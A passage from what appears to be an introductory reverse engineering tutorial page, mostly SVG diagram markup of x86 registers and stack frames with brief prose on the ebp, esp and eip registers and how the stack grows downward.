<text text-anchor='middle' x='480' y='228' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='480' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='132' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='488' y='164' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='488' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='196' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='488' y='228' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='488' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='276' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='488' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='388' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='488' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='228' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='496' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='276' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='496' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='388' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='496' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='276' fill='currentColor' style='font-size:1em'>X</text>
<text text-anchor='middle' x='504' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='388' fill='currentColor' style='font-size:1em'>X</text>
<text text-anchor='middle' x='504' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='228' fill='currentColor' style='font-size:1em'>(</text>
<text text-anchor='middle' x='512' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='228' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='520' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='180' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='528' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='228' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='528' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='180' fill='currentColor' style='font-size:1em'>H</text>
<text text-anchor='middle' x='536' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='228' fill='currentColor' style='font-size:1em'>X</text>
<text text-anchor='middle' x='536' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='132' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='544' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='228' fill='currentColor' style='font-size:1em'>)</text>
<text text-anchor='middle' x='544' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='132' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='552' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='52' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='560' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='84' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='560' y='132' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='560' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='20' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='568' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='132' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='568' y='164' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='568' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='568' y='196' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='568' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='132' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='576' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='20' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='584' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='132' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='584' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='20' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='592' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='132' fill='currentColor' style='font-size:1em'>(</text>
<text text-anchor='middle' x='592' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='20' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='600' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='68' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='600' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='132' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='600' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='20' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='608' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='132' fill='currentColor' style='font-size:1em'>X</text>
<text text-anchor='middle' x='608' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='180' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='608' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='20' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='616' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='132' fill='currentColor' style='font-size:1em'>)</text>
<text text-anchor='middle' x='616' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='180' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='616' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='20' fill='currentColor' style='font-size:1em'>►</text>
<text text-anchor='middle' x='640' y='52' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='640' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='640' y='84' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='640' y='132' fill='currentColor' style='font-size:1em'>►</text>
<text text-anchor='middle' x='640' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='228' fill='currentColor' style='font-size:1em'>►</text>
<text text-anchor='middle' x='640' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='340' fill='currentColor' style='font-size:1em'>►</text>
<text text-anchor='middle' x='640' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='164' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='648' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='648' y='196' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='648' y='260' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='648' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='648' y='292' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='648' y='372' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='648' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='648' y='404' fill='currentColor' style='font-size:1em'>┘</text>
</g>

    </svg>
  
</div>
<p>Nowadays, 64-bit and 32-bit systems are very common and can be easily found. Knowing this is very important to reverse engineer arithmatic and logic calculations from any disassembly code.</p>
<p>Apart from these general register, there are 3 special purpose registers - <code>ebp</code>, <code>esp</code> and <code>eip</code>. These registers are generally used to point to different memory locations of the stack. There are some times when we need to store the values of these registers on to the stack (Another kind of memory area used by processes). We&rsquo;ll see some of those cases as we go further.</p>
<p><strong>Stack</strong> is a data structure in memory which operates with 2 operations - <code>push</code> and <code>pop</code>. <em>Push</em> adds an element to the top of the stack and <code>pop</code> removes the top element of the stack.</p>
<p>Each element on the stack has an assigned stack address which can be used to refer any location on the stack. The stack is upside down - means that the stack grows towards the lower memory addresses.</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 592 537"
      >
      <g transform='translate(8,16)'>
<text text-anchor='middle' x='64' y='36' fill='currentColor' style='font-size:1em'>H</text>
<text text-anchor='middle' x='72' y='36' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='72' y='516' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='80' y='36' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='80' y='516' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='88' y='36' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='88' y='516' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='104' y='36' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='104' y='516' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='112' y='36' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='112' y='516' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='120' y='36' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='120' y='516' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='128' y='36' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='128' y='516' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='136' y='36' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='136' y='260' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='136' y='516' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='144' y='36' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='144' y='148' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='144' y='260' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='144' y='372' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='144' y='516' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='152' y='36' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='152' y='148' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='152' y='260' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='152' y='372' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='152' y='516' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='160' y='148' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='160' y='260' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='160' y='372' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='168' y='148' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='168' y='260' fill='currentColor' style='font-size:1em'>k</text>
<text text-anchor='middle' x='168' y='372' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='176' y='148' fill='currentColor' style='font-size:1em'>k</text>
<text text-anchor='middle' x='176' y='372' fill='currentColor' style='font-size:1em'>k</text>
<text text-anchor='middle' x='184' y='260' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='192' y='148' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='192' y='260' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='192' y='372' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='200' y='148' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='200' y='212' fill='currentColor' style='font-size:1em'>▲</text>
<text text-anchor='middle' x='200' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='200' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='200' y='260' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='200' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='200' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='200' y='308' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='200' y='372' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='208' y='148' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='208' y='260' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='208' y='372' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='216' y='148' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='216' y='260' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='216' y='372' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='224' y='100' fill='currentColor' style='font-size:1em'>▲</text>
<text text-anchor='middle' x='224' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='148' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='224' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='196' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='224' y='324' fill='currentColor' style='font-size:1em'>▲</text>
<text text-anchor='middle' x='224' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='372' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='224' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='420' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='232' y='260' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='240' y='148' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='240' y='372' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='256' y='84' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='256' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='196' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='256' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='308' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='256' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='420' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='256' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='452' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='308' fill='currentColor' style='font-size:1em'>─</text>
